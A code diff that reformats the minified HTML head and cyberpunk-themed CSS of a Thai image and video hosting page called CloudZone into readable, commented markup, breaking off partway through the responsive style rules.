@@ -1,4 +1,630 @@
-<!DOCTYPE html><html lang="th"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta name="description" content="CloudZone — ฝากรูปภาพและวิดีโอฟรี ไม่จำกัดจำนวน รองรับ JPG PNG GIF WEBP MP4 MOV WEBM PDF อัพโหลดง่าย ปลอดภัย รวดเร็ว"><meta name="keywords" content="ฝากรูป, ฝากวิดีโอ, อัพโหลดรูป, image hosting, video hosting, CloudZone, ฟรี, ไม่จำกัด"><meta name="robots" content="index, follow"><meta name="author" content="x2Snow"><link rel="canonical" href="https://cloudzone.xephex.xyz/"><meta property="og:type" content="website"><meta property="og:url" content="https://cloudzone.xephex.xyz/"><meta property="og:title" content="CloudZone — ฝากรูปภาพ & วิดีโอฟรี"><meta property="og:description" content="อัพโหลดรูปภาพและวิดีโอเก็บบนเซิฟเวอร์ฟรี ไม่จำกัดจำนวน ลิ้งค์ไม่หมดอายุ รองรับหลายฟอร์แมต"><meta property="og:image" content="https://cloudzone.xephex.xyz/uploads/file_000000003878720b88f8eeef98579f44_1d29fa.jpg"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="CloudZone — ฝากรูปภาพ & วิดีโอฟรี"><meta name="twitter:description" content="อัพโหลดรูปภาพและวิดีโอเก็บบนเซิฟเวอร์ฟรี ไม่จำกัดจำนวน"><meta name="twitter:image" content="https://cloudzone.xephex.xyz/uploads/file_000000003878720b88f8eeef98579f44_1d29fa.jpg"><title>CloudZone — ฝากรูป & วิดีโอ</title><link rel="icon" href="https://cloudzone.xephex.xyz/uploads/file_000000003878720b88f8eeef98579f44_1d29fa.jpg"><link rel="preconnect" href="https://fonts.googleapis.com"><link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;700;900&family=Sarabun:wght@300;400;500;600;700&family=Share+Tech+Mono&display=swap" rel="stylesheet"><link href="https://unpkg.com/aos@2.3.4/dist/aos.css" rel="stylesheet"/><script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script><style>:root{--bg:#00060f;--surface:#00111f;--card:#001628;--border:#0a4060;--accent:#00d4ff;--accent2:#60efff;--accent3:#ffffff;--green:#00ffcc;--red:#ff3355;--warn:#ffaa00;--text:#c8eeff;--muted:#3a7090;--glow:rgba(0,212,255,.45);--font:'Sarabun',sans-serif;--mono:'Share Tech Mono',monospace;--hud:'Orbitron',sans-serif}*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}html{scroll-behavior:smooth}body{font-family:var(--font);background:var(--bg);color:var(--text);min-height:100vh;overflow-x:hidden}body::before{content:'';position:fixed;inset:0;z-index:0;background-image:radial-gradient(ellipse 90% 55% at 15% 0%,rgba(0,180,255,.10) 0%,transparent 60%),radial-gradient(ellipse 70% 45% at 90% 100%,rgba(0,100,200,.12) 0%,transparent 55%),linear-gradient(0deg,rgba(0,212,255,.025) 1px,transparent 1px),linear-gradient(90deg,rgba(0,212,255,.025) 1px,transparent 1px);background-size:auto,auto,40px 40px,40px 40px;pointer-events:none}body::after{content:'';position:fixed;inset:0;z-index:0;background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,0,0,.12) 3px,rgba(0,0,0,.12) 4px);pointer-events:none}.wrap{position:relative;z-index:1;max-width:860px;margin:0 auto;padding:0 16px 80px}@media(max-width:479px){.wrap{padding:0 12px 60px}header{padding:24px 0 20px}.logo-text{font-size:1.1rem}.card{padding:20px 16px}.card-title{font-size:.95rem}.dropzone{padding:32px 14px}.dz-icon svg{width:38px;height:38px}.dz-text{font-size:.85rem}.btn-upload{padding:14px;font-size:.85rem}.hist-thumb{width:56px;height:56px}.hist-name{font-size:.75rem}.hist-meta{font-size:.65rem}footer{font-size:.7rem}}@media(min-width:480px) and (max-width:767px){.wrap{padding:0 18px 70px}header{padding:30px 0 24px}.card{padding:24px 20px}}@media(min-width:1024px){.wrap{padding:0 24px 100px}header{padding:48px 0 36px}.card{padding:36px 40px}.card-title{font-size:1.2rem}.dropzone{padding:56px 32px}.dz-icon svg{width:56px;height:56px}.dz-text{font-size:1.05rem}.btn-upload{padding:18px;font-size:1rem}.hist-thumb{width:84px;height:84px}}@keyframes spin{to{transform:rotate(360deg)}}@keyframes pulse-glow{0%,100%{opacity:.6;box-shadow:0 0 8px var(--glow)}50%{opacity:1;box-shadow:0 0 22px var(--glow),0 0 40px rgba(0,212,255,.2)}}@keyframes scan-line{0%{top:-10%}100%{top:110%}}@keyframes glitch{0%,100%{transform:none;filter:none}92%{transform:none;filter:none}93%{transform:translate(-2px,0) skewX(-2deg);filter:hue-rotate(90deg)}95%{transform:translate(2px,0) skewX(2deg);filter:hue-rotate(-60deg)}97%{transform:none;filter:none}}@keyframes blink-cursor{0%,100%{opacity:1}50%{opacity:0}}@keyframes border-flow{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}@keyframes slide-in-right{from{transform:translateX(20px);opacity:0}to{transform:none;opacity:1}}@keyframes neon-flicker{0%,19%,21%,100%{opacity:1}20%{opacity:.4}}header{padding:40px 0 32px;display:flex;align-items:center;justify-content:space-between;position:relative}header::after{content:'';position:absolute;bottom:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,var(--accent),var(--accent2),transparent);opacity:.4}.logo{display:flex;align-items:center;gap:14px}.logo-icon{width:44px;height:44px;background:linear-gradient(135deg,rgba(0,212,255,.2),rgba(0,100,180,.3));border:1px solid var(--accent);clip-path:polygon(8px 0%,100% 0%,100% calc(100% - 8px),calc(100% - 8px) 100%,0% 100%,0% 8px);display:flex;align-items:center;justify-content:center;box-shadow:0 0 18px var(--glow),inset 0 0 12px rgba(0,212,255,.1);animation:pulse-glow 3s ease-in-out infinite;padding:2px;overflow:hidden}.logo-icon img{width:32px;height:32px;object-fit:contain;clip-path:polygon(6px 0%,100% 0%,100% calc(100% - 6px),calc(100% - 6px) 100%,0% 100%,0% 6px)}.logo-text{font-family:var(--hud);font-size:1.3rem;font-weight:900;letter-spacing:2px;color:#fff;text-shadow:0 0 12px var(--accent),0 0 24px rgba(0,212,255,.4);animation:glitch 8s ease-in-out infinite}.logo-text span{color:var(--accent);text-shadow:0 0 14px var(--accent)}.badge{font-family:var(--hud);font-size:.6rem;letter-spacing:2px;text-transform:uppercase;color:var(--accent);border:1px solid var(--accent);padding:4px 12px;clip-path:polygon(6px 0%,100% 0%,100% calc(100% - 6px),calc(100% - 6px) 100%,0% 100%,0% 6px);background:rgba(0,212,255,.08);box-shadow:0 0 10px rgba(0,212,255,.2);position:relative;overflow:hidden}.badge::before{content:'';position:absolute;top:0;left:-100%;width:100%;height:100%;background:linear-gradient(90deg,transparent,rgba(0,212,255,.3),transparent);animation:scan-line 2.5s linear infinite}.card{background:linear-gradient(135deg,rgba(0,22,40,.95),rgba(0,14,28,.98));border:1px solid rgba(0,150,200,.35);border-radius:0;padding:32px;margin-bottom:20px;position:relative;clip-path:polygon(16px 0%,100% 0%,100% calc(100% - 16px),calc(100% - 16px) 100%,0% 100%,0% 16px);transition:border-color .3s,box-shadow .3s}.card::before,.card::after{content:'';position:absolute;width:20px;height:20px;border-color:var(--accent);border-style:solid;box-shadow:0 0 8px var(--glow)}.card::before{top:0;left:0;border-width:2px 0 0 2px}.card::after{bottom:0;right:0;border-width:0 2px 2px 0}.card:hover{border-color:rgba(0,212,255,.6);box-shadow:0 0 30px rgba(0,212,255,.1),inset 0 0 30px rgba(0,212,255,.03)}.card-header-line{position:absolute;top:0;left:16px;right:0;height:2px;background:linear-gradient(90deg,var(--accent),var(--accent2),transparent);opacity:.7}.card-title{font-family:var(--hud);font-size:1.1rem;font-weight:700;margin-bottom:4px;color:#fff;letter-spacing:2px;text-shadow:0 0 10px rgba(0,212,255,.5)}.card-title::before{content:'// ';color:var(--accent);opacity:.7}.card-sub{font-family:var(--mono);font-size:.8rem;color:var(--muted);margin-bottom:28px;letter-spacing:.5px}.dropzone{border:1px solid rgba(0,150,200,.4);border-radius:0;padding:48px 20px;text-align:center;cursor:pointer;transition:all .3s ease;background:rgba(0,212,255,.02);position:relative;overflow:hidden;clip-path:polygon(10px 0%,100% 0%,100% calc(100% - 10px),calc(100% - 10px) 100%,0% 100%,0% 10px)}.dropzone::before{content:'';position:absolute;inset:0;background:radial-gradient(ellipse at center,rgba(0,212,255,.06) 0%,transparent 70%);opacity:0;transition:opacity .4s}.dropzone::after{content:'';position:absolute;top:8px;right:8px;width:16px;height:16px;border-top:2px solid var(--accent);border-right:2px solid var(--accent);opacity:.6}.dz-corner-bl{position:absolute;bottom:8px;left:8px;width:16px;height:16px;border-bottom:2px solid var(--accent);border-left:2px solid var(--accent);opacity:.6;pointer-events:none}.dropzone:hover::before,.dropzone.drag-over::before{opacity:1}.dropzone:hover,.dropzone.drag-over{border-color:var(--accent);background:rgba(0,212,255,.05);box-shadow:0 0 25px rgba(0,212,255,.15),inset 0 0 25px rgba(0,212,255,.04)}.dropzone.drag-over{transform:scale(1.008)}.dz-icon{display:flex;justify-content:center;margin-bottom:14px;color:var(--accent)}.dz-icon svg{width:48px;height:48px}.dz-text{font-family:var(--hud);font-size:.95rem;font-weight:600;color:var(--text);margin-bottom:6px;letter-spacing:1.5px}.dz-sub{font-family:var(--mono);font-size:.78rem;color:var(--muted);letter-spacing:.5px}.dz-types{display:flex;gap:8px;justify-content:center;flex-wrap:wrap;margin-top:18px}.dz-tag{font-family:var(--hud);font-size:.6rem;background:rgba(0,212,255,.06);color:var(--accent);border:1px solid rgba(0,212,255,.25);padding:3px 10px;letter-spacing:1.5px;clip-path:polygon(4px 0%,100% 0%,100% calc(100% - 4px),calc(100% - 4px) 100%,0% 100%,0% 4px)}#fileInput{display:none}#previewArea{display:none;margin-top:20px;overflow:hidden;border:1px solid rgba(0,150,200,.4);background:var(--surface);clip-path:polygon(10px 0%,100% 0%,100% calc(100% - 10px),calc(100% - 10px) 100%,0% 100%,0% 10px)}#previewArea img,#previewArea video{width:100%;max-height:320px;object-fit:contain;display:block}.preview-info{padding:10px 16px;display:flex;align-items:center;justify-content:space-between;border-top:1px solid rgba(0,150,200,.25);gap:10px;background:rgba(0,20,40,.8)}.preview-name{font-family:var(--mono);font-size:.78rem;color:var(--accent);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;flex:1}.preview-size{font-family:var(--mono);font-size:.75rem;color:var(--muted);white-space:nowrap}.btn-clear{background:rgba(255,51,85,.08);border:1px solid rgba(255,51,85,.3);color:var(--red);padding:5px 12px;font-size:.75rem;cursor:pointer;font-family:var(--hud);letter-spacing:1px;transition:all .2s;display:flex;align-items:center;gap:5px;white-space:nowrap;clip-path:polygon(4px 0%,100% 0%,100% calc(100% - 4px),calc(100% - 4px) 100%,0% 100%,0% 4px)}.btn-clear svg{width:13px;height:13px}.btn-clear:hover{background:rgba(255,51,85,.18);box-shadow:0 0 12px rgba(255,51,85,.3)}.settings-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-top:20px}@media(max-width:520px){.settings-grid{grid-template-columns:1fr}}.field label{display:flex;align-items:center;gap:7px;font-family:var(--hud);font-size:.62rem;font-weight:600;color:var(--accent);text-transform:uppercase;letter-spacing:1.5px;margin-bottom:8px}.field label svg{width:14px;height:14px;flex-shrink:0}.field select{width:100%;background:rgba(0,20,40,.9);border:1px solid rgba(0,150,200,.35);color:var(--text);font-family:var(--mono);font-size:.88rem;padding:11px 36px 11px 14px;outline:none;cursor:pointer;transition:border-color .2s,box-shadow .2s;appearance:none;-webkit-appearance:none;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='7'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%2300d4ff' stroke-width='1.5' fill='none' stroke-linecap='round'/%3E%3C/svg%3E");background-repeat:no-repeat;background-position:right 14px center;clip-path:polygon(6px 0%,100% 0%,100% calc(100% - 6px),calc(100% - 6px) 100%,0% 100%,0% 6px)}.field select:focus{border-color:var(--accent);box-shadow:0 0 0 2px rgba(0,212,255,.15),0 0 15px rgba(0,212,255,.1)}.field select option{background:#001628;color:var(--text)}.btn-upload{width:100%;margin-top:24px;background:linear-gradient(90deg,#003a5c 0%,#005580 40%,#0088aa 70%,#00d4ff 100%);color:#fff;border:none;padding:16px;font-family:var(--hud);font-size:.95rem;font-weight:700;letter-spacing:2px;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;transition:all .3s ease;position:relative;overflow:hidden;box-shadow:0 0 24px rgba(0,212,255,.3),inset 0 1px 0 rgba(255,255,255,.1);clip-path:polygon(12px 0%,100% 0%,100% calc(100% - 12px),calc(100% - 12px) 100%,0% 100%,0% 12px);text-transform:uppercase}.btn-upload::before{content:'';position:absolute;inset:0;background:linear-gradient(90deg,transparent 0%,rgba(255,255,255,.12) 50%,transparent 100%);transform:translateX(-100%);transition:transform .5s ease}.btn-upload:hover::before{transform:translateX(100%)}.btn-upload:hover{box-shadow:0 0 40px rgba(0,212,255,.5),0 0 80px rgba(0,212,255,.2);transform:translateY(-1px)}.btn-upload:active{transform:translateY(0);box-shadow:0 0 15px rgba(0,212,255,.3)}.btn-upload:disabled{opacity:.4;cursor:not-allowed;transform:none;box-shadow:none}#progressWrap{display:none;margin-top:20px}.progress-label{font-family:var(--mono);font-size:.78rem;color:var(--muted);margin-bottom:8px;display:flex;justify-content:space-between;letter-spacing:.5px}.progress-bar-bg{background:rgba(0,20,40,.8);height:8px;overflow:hidden;border:1px solid rgba(0,150,200,.3);clip-path:polygon(4px 0%,100% 0%,100% calc(100% - 4px),calc(100% - 4px) 100%,0% 100%,0% 4px)}.progress-bar-fill{height:100%;background:linear-gradient(90deg,#003a80,#0066cc,#00aaff,#00d4ff,#60efff);background-size:200% 100%;animation:border-flow 1.5s linear infinite;width:0%;transition:width .4s ease;box-shadow:0 0 12px var(--accent),0 0 24px rgba(0,212,255,.4)}#resultCard{display:none;background:linear-gradient(135deg,rgba(0,255,200,.04),rgba(0,212,255,.06));border:1px solid rgba(0,255,180,.35);padding:24px;margin-bottom:20px;position:relative;clip-path:polygon(12px 0%,100% 0%,100% calc(100% - 12px),calc(100% - 12px) 100%,0% 100%,0% 12px);box-shadow:0 0 20px rgba(0,255,200,.08)}#resultCard::before{content:'';position:absolute;top:0;left:12px;right:0;height:2px;background:linear-gradient(90deg,var(--green),var(--accent),transparent)}.result-header{display:flex;align-items:center;gap:12px;margin-bottom:16px}.result-header svg{width:24px;height:24px;color:var(--green);flex-shrink:0;filter:drop-shadow(0 0 6px var(--green))}.result-title{font-family:var(--hud);font-size:.95rem;font-weight:700;color:var(--green);letter-spacing:1.5px;text-shadow:0 0 10px rgba(0,255,200,.5)}.result-sub{font-family:var(--mono);font-size:.78rem;color:var(--muted);letter-spacing:.5px;margin-top:2px}.url-row{display:flex;gap:10px;margin-bottom:10px}.url-input{flex:1;background:rgba(0,10,20,.9);border:1px solid rgba(0,150,200,.3);color:var(--accent);font-family:var(--mono);font-size:.75rem;padding:10px 14px;outline:none;clip-path:polygon(6px 0%,100% 0%,100% calc(100% - 6px),calc(100% - 6px) 100%,0% 100%,0% 6px)}.btn-copy{background:rgba(0,212,255,.08);border:1px solid rgba(0,212,255,.3);color:var(--accent);padding:10px 14px;font-size:.8rem;cursor:pointer;font-family:var(--hud);letter-spacing:1px;white-space:nowrap;transition:all .2s;display:flex;align-items:center;gap:6px;clip-path:polygon(6px 0%,100% 0%,100% calc(100% - 6px),calc(100% - 6px) 100%,0% 100%,0% 6px)}.btn-copy svg{width:15px;height:15px;flex-shrink:0}.btn-copy:hover{background:rgba(0,212,255,.18);box-shadow:0 0 15px rgba(0,212,255,.3)}.btn-copy.copied{color:var(--green);border-color:rgba(0,255,200,.4);box-shadow:0 0 12px rgba(0,255,200,.2)}#historyCard{display:none}.history-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:16px}.history-title{display:flex;align-items:center;gap:8px;font-family:var(--hud);font-size:.65rem;font-weight:600;color:var(--accent);text-transform:uppercase;letter-spacing:1.5px}.history-title svg{width:14px;height:14px}.history-count{font-family:var(--hud);font-size:.6rem;color:var(--accent);background:rgba(0,212,255,.1);border:1px solid rgba(0,212,255,.25);padding:3px 10px;letter-spacing:1px;clip-path:polygon(4px 0%,100% 0%,100% calc(100% - 4px),calc(100% - 4px) 100%,0% 100%,0% 4px)}#historyList{display:flex;flex-direction:column;gap:10px}.hist-item{background:rgba(0,18,35,.95);border:1px solid rgba(0,120,180,.25);padding:12px 16px;display:flex;align-items:center;gap:14px;transition:border-color .2s,box-shadow .2s,opacity .25s,transform .25s;position:relative;clip-path:polygon(8px 0%,100% 0%,100% calc(100% - 8px),calc(100% - 8px) 100%,0% 100%,0% 8px)}.hist-item::before{content:'';position:absolute;left:0;top:0;bottom:0;width:2px;background:linear-gradient(180deg,transparent,var(--accent),transparent);opacity:0;transition:opacity .3s}.hist-item:hover{border-color:rgba(0,212,255,.45);box-shadow:0 0 18px rgba(0,212,255,.08)}.hist-item:hover::before{opacity:.6}.hist-thumb{width:72px;height:72px;background:rgba(0,20,40,.8);flex-shrink:0;display:flex;align-items:center;justify-content:center;overflow:hidden;border:1px solid rgba(0,120,180,.3);clip-path:polygon(6px 0%,100% 0%,100% calc(100% - 6px),calc(100% - 6px) 100%,0% 100%,0% 6px)}.hist-thumb svg{width:28px;height:28px;color:var(--muted)}.hist-thumb img,.hist-thumb video{width:100%;height:100%;object-fit:cover;display:block}.hist-info{flex:1;min-width:0}.hist-name{font-family:var(--mono);font-size:.82rem;color:var(--text);font-weight:500;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.hist-meta{font-family:var(--mono);font-size:.72rem;color:var(--muted);margin-top:3px;letter-spacing:.3px}.hist-actions{display:flex;gap:4px;flex-shrink:0}.hist-btn{background:none;border:1px solid transparent;cursor:pointer;padding:7px;transition:all .2s;display:flex;align-items:center;color:var(--muted);clip-path:polygon(4px 0%,100% 0%,100% calc(100% - 4px),calc(100% - 4px) 100%,0% 100%,0% 4px)}.hist-btn svg{width:15px;height:15px}.hist-btn.copy-btn:hover{color:var(--accent);background:rgba(0,212,255,.1);border-color:rgba(0,212,255,.25);box-shadow:0 0 8px rgba(0,212,255,.2)}.hist-btn.del-btn:hover{color:var(--red);background:rgba(255,51,85,.1);border-color:rgba(255,51,85,.25);box-shadow:0 0 8px rgba(255,51,85,.2)}.hist-btn.del-btn.loading{opacity:.5;pointer-events:none}#errorBox{display:none;background:rgba(255,51,85,.05);border:1px solid rgba(255,51,85,.3);padding:14px 18px;color:var(--red);font-family:var(--mono);font-size:.85rem;margin-top:16px;align-items:center;gap:10px;clip-path:polygon(8px 0%,100% 0%,100% calc(100% - 8px),calc(100% - 8px) 100%,0% 100%,0% 8px);box-shadow:0 0 15px rgba(255,51,85,.1)}#errorBox svg{width:18px;height:18px;flex-shrink:0}#debugPanel{display:none;margin-top:14px;background:rgba(0,6,15,.95);border:1px solid rgba(0,80,140,.4);overflow:hidden;clip-path:polygon(8px 0%,100% 0%,100% calc(100% - 8px),calc(100% - 8px) 100%,0% 100%,0% 8px)}.dbg-header{background:rgba(0,100,160,.15);border-bottom:1px solid rgba(0,100,160,.3);padding:10px 16px;display:flex;align-items:center;justify-content:space-between}.dbg-title{font-family:var(--hud);font-size:.65rem;color:var(--accent);text-transform:uppercase;letter-spacing:1.5px;display:flex;align-items:center;gap:7px}.dbg-title svg{width:14px;height:14px}.dbg-close{background:none;border:none;color:var(--muted);cursor:pointer;padding:4px 8px;transition:color .2s;display:flex;align-items:center}.dbg-close svg{width:14px;height:14px}.dbg-close:hover{color:var(--red)}.dbg-body{padding:14px 16px}.dbg-row{display:flex;gap:10px;margin-bottom:10px;align-items:flex-start}.dbg-lbl{font-family:var(--hud);font-size:.62rem;color:var(--accent);min-width:120px;padding-top:2px;text-transform:uppercase;letter-spacing:1px;flex-shrink:0}.dbg-val{font-family:var(--mono);font-size:.78rem;color:#e2eaf4;word-break:break-all;line-height:1.5}.dbg-val.ok{color:var(--green)}.dbg-val.err{color:var(--red)}.dbg-val.warn{color:var(--warn)}.dbg-sep{border:none;border-top:1px solid rgba(0,80,140,.3);margin:10px 0}.dbg-raw{font-family:var(--mono);font-size:.75rem;color:#94a3b8;background:rgba(0,4,10,.9);padding:10px 12px;margin-top:6px;white-space:pre-wrap;word-break:break-all;max-height:160px;overflow-y:auto;line-height:1.5;border:1px solid rgba(0,80,140,.3);clip-path:polygon(4px 0%,100% 0%,100% calc(100% - 4px),calc(100% - 4px) 100%,0% 100%,0% 4px)}.dbg-copy{margin-top:8px;background:none;border:1px solid rgba(0,80,140,.4);color:var(--accent);padding:5px 12px;font-family:var(--hud);font-size:.62rem;letter-spacing:1px;cursor:pointer;transition:all .2s;display:inline-flex;align-items:center;gap:6px;clip-path:polygon(4px 0%,100% 0%,100% calc(100% - 4px),calc(100% - 4px) 100%,0% 100%,0% 4px)}.dbg-copy:hover{background:rgba(0,150,200,.15)}footer{text-align:center;padding:40px 0 20px;font-family:var(--mono);font-size:.75rem;color:var(--muted);letter-spacing:.5px;position:relative}footer::before{content:'';position:absolute;top:0;left:20%;right:20%;height:1px;background:linear-gradient(90deg,transparent,rgba(0,212,255,.3),transparent)}footer span{color:var(--accent);text-shadow:0 0 8px rgba(0,212,255,.5)}.mf-item{display:flex;align-items:center;gap:10px;background:rgba(0,18,35,.9);border:1px solid rgba(0,120,180,.25);padding:9px 12px;clip-path:polygon(6px 0%,100% 0%,100% calc(100% - 6px),calc(100% - 6px) 100%,0% 100%,0% 6px);transition:border-color .2s}.mf-item.done{border-color:rgba(0,255,160,.3)}.mf-item.fail{border-color:rgba(255,51,85,.3)}.mf-thumb{width:38px;height:38px;flex-shrink:0;background:rgba(0,30,50,.8);border:1px solid rgba(0,120,180,.2);display:flex;align-items:center;justify-content:center;overflow:hidden;clip-path:polygon(4px 0%,100% 0%,100% calc(100% - 4px),calc(100% - 4px) 100%,0% 100%,0% 4px)}.mf-thumb img{width:100%;height:100%;object-fit:cover;display:block}.mf-thumb svg{width:18px;height:18px;color:var(--muted)}.mf-info{flex:1;min-width:0}.mf-name{font-family:var(--mono);font-size:.78rem;color:var(--text);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.mf-size{font-family:var(--mono);font-size:.7rem;color:var(--muted);margin-top:2px}.mf-status{font-family:var(--mono);font-size:.7rem;margin-top:2px}.mf-status.ok{color:var(--green)}.mf-status.err{color:var(--red)}.mf-status.wait{color:var(--muted)}.mf-remove{background:none;border:none;cursor:pointer;padding:4px;color:var(--muted);display:flex;align-items:center;transition:color .2s;flex-shrink:0}.mf-remove:hover{color:var(--red)}.mf-remove svg{width:14px;height:14px}.spinner{width:20px;height:20px;border-radius:50%;border:2px solid rgba(0,212,255,.25);border-top-color:var(--accent);animation:spin .7s linear infinite;flex-shrink:0;box-shadow:0 0 8px var(--glow)}.swal2-popup{background:rgba(0,16,30,.97) !important;border:1px solid rgba(0,150,200,.4) !important;border-radius:0 !important;clip-path:polygon(12px 0%,100% 0%,100% calc(100% - 12px),calc(100% - 12px) 100%,0% 100%,0% 12px) !important;font-family:var(--font) !important;box-shadow:0 0 40px rgba(0,150,200,.15) !important}.swal2-title{color:var(--text) !important;font-family:var(--hud) !important;letter-spacing:1px !important;font-size:1.1rem !important}.swal2-html-container{color:var(--muted) !important;font-family:var(--mono) !important;font-size:.88rem !important}.swal2-confirm{background:linear-gradient(90deg,#003a5c,#0066aa) !important;border:1px solid var(--accent) !important;border-radius:0 !important;font-family:var(--hud) !important;font-weight:600 !important;letter-spacing:1px !important;box-shadow:0 0 12px rgba(0,212,255,.3) !important;clip-path:polygon(6px 0%,100% 0%,100% calc(100% - 6px),calc(100% - 6px) 100%,0% 100%,0% 6px) !important}.swal2-cancel{background:rgba(0,20,40,.8) !important;color:var(--muted) !important;border:1px solid rgba(0,80,120,.4) !important;border-radius:0 !important;font-family:var(--hud) !important;font-weight:600 !important;letter-spacing:1px !important;box-shadow:none !important;clip-path:polygon(6px 0%,100% 0%,100% calc(100% - 6px),calc(100% - 6px) 100%,0% 100%,0% 6px) !important}.swal2-cancel:hover{background:rgba(0,40,70,.8) !important;color:var(--text) !important}.swal2-icon{border-color:var(--accent) !important;filter:drop-shadow(0 0 6px var(--accent)) !important}.swal2-icon .swal2-icon-content{color:var(--accent) !important}.swal2-icon.swal2-success{border-color:var(--green) !important;background:transparent !important;box-shadow:0 0 18px rgba(0,255,160,.25) !important;filter:drop-shadow(0 0 8px var(--green)) !important}.swal2-success-circular-line-left,.swal2-success-circular-line-right,.swal2-success-fix{display:none !important}.swal2-success-ring{border-color:rgba(0,255,160,.2) !important}.swal2-success-line-tip,.swal2-success-line-long{background:var(--green) !important}.scan-fx{position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,transparent,rgba(0,212,255,.6),transparent);animation:scan-line 3s linear infinite;pointer-events:none;z-index:10}.sys-status{display:flex;align-items:center;gap:6px;font-family:var(--hud);font-size:.6rem;letter-spacing:1.5px;color:var(--green);text-transform:uppercase}.sys-dot{width:6px;height:6px;background:var(--green);border-radius:50%;box-shadow:0 0 6px var(--green);animation:pulse-glow 1.8s ease-in-out infinite}</style><script type="application/ld+json">
+<!DOCTYPE html>
+<html lang="th">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="description" content="CloudZone — ฝากรูปภาพและวิดีโอฟรี ไม่จำกัดจำนวน รองรับ JPG PNG GIF WEBP MP4 MOV WEBM PDF อัพโหลดง่าย ปลอดภัย รวดเร็ว">
+  <meta name="keywords" content="ฝากรูป, ฝากวิดีโอ, อัพโหลดรูป, image hosting, video hosting, CloudZone, ฟรี, ไม่จำกัด">
+  <meta name="robots" content="index, follow">
+  <meta name="author" content="x2Snow">
+  <link rel="canonical" href="https://cloudzone.xephex.xyz/">
+
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://cloudzone.xephex.xyz/">
+  <meta property="og:title" content="CloudZone — ฝากรูปภาพ & วิดีโอฟรี">
+  <meta property="og:description" content="อัพโหลดรูปภาพและวิดีโอเก็บบนเซิฟเวอร์ฟรี ไม่จำกัดจำนวน ลิ้งค์ไม่หมดอายุ รองรับหลายฟอร์แมต">
+  <meta property="og:image" content="https://cloudzone.xephex.xyz/uploads/file_000000003878720b88f8eeef98579f44_1d29fa.jpg">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="CloudZone — ฝากรูปภาพ & วิดีโอฟรี">
+  <meta name="twitter:description" content="อัพโหลดรูปภาพและวิดีโอเก็บบนเซิฟเวอร์ฟรี ไม่จำกัดจำนวน">
+  <meta name="twitter:image" content="https://cloudzone.xephex.xyz/uploads/file_000000003878720b88f8eeef98579f44_1d29fa.jpg">
+  <title>CloudZone — ฝากรูป & วิดีโอ</title>
+
+  
+  <link rel="icon" href="https://cloudzone.xephex.xyz/uploads/file_000000003878720b88f8eeef98579f44_1d29fa.jpg">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;700;900&family=Sarabun:wght@300;400;500;600;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+  
+  <link href="https://unpkg.com/aos@2.3.4/dist/aos.css" rel="stylesheet"/>
+  
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
+  <style>
+    :root {
+      --bg:#00060f;
+      --surface:#00111f;
+      --card:#001628;
+      --border:#0a4060;
+      --accent:#00d4ff;
+      --accent2:#60efff;
+      --accent3:#ffffff;
+      --green:#00ffcc;
+      --red:#ff3355;
+      --warn:#ffaa00;
+      --text:#c8eeff;
+      --muted:#3a7090;
+      --glow:rgba(0,212,255,.45);
+      --font:'Sarabun',sans-serif;
+      --mono:'Share Tech Mono',monospace;
+      --hud:'Orbitron',sans-serif;
+    }
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+    html{scroll-behavior:smooth}
+
+    /* ── BODY & BACKGROUND ── */
+    body{
+      font-family:var(--font);
+      background:var(--bg);
+      color:var(--text);
+      min-height:100vh;
+      overflow-x:hidden;
+    }
+    /* Hex grid bg */
+    body::before{
+      content:'';position:fixed;inset:0;z-index:0;
+      background-image:
+        radial-gradient(ellipse 90% 55% at 15% 0%,rgba(0,180,255,.10) 0%,transparent 60%),
+        radial-gradient(ellipse 70% 45% at 90% 100%,rgba(0,100,200,.12) 0%,transparent 55%),
+        linear-gradient(0deg,rgba(0,212,255,.025) 1px,transparent 1px),
+        linear-gradient(90deg,rgba(0,212,255,.025) 1px,transparent 1px);
+      background-size:auto,auto,40px 40px,40px 40px;
+      pointer-events:none;
+    }
+    /* Scanlines */
+    body::after{
+      content:'';position:fixed;inset:0;z-index:0;
+      background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,0,0,.12) 3px,rgba(0,0,0,.12) 4px);
+      pointer-events:none;
+    }
+    .wrap{position:relative;z-index:1;max-width:860px;margin:0 auto;padding:0 16px 80px}
+
+    /* ── RESPONSIVE ── */
+    /* Mobile default (< 480px) */
+    @media(max-width:479px){
+      .wrap{padding:0 12px 60px}
+      header{padding:24px 0 20px}
+      .logo-text{font-size:1.1rem}
+      .card{padding:20px 16px}
+      .card-title{font-size:.95rem}
+      .dropzone{padding:32px 14px}
+      .dz-icon svg{width:38px;height:38px}
+      .dz-text{font-size:.85rem}
+      .btn-upload{padding:14px;font-size:.85rem}
+      .hist-thumb{width:56px;height:56px}
+      .hist-name{font-size:.75rem}
+      .hist-meta{font-size:.65rem}
+      footer{font-size:.7rem}
+    }
+    /* Tablet (480px – 767px) */
+    @media(min-width:480px) and (max-width:767px){
+      .wrap{padding:0 18px 70px}
+      header{padding:30px 0 24px}
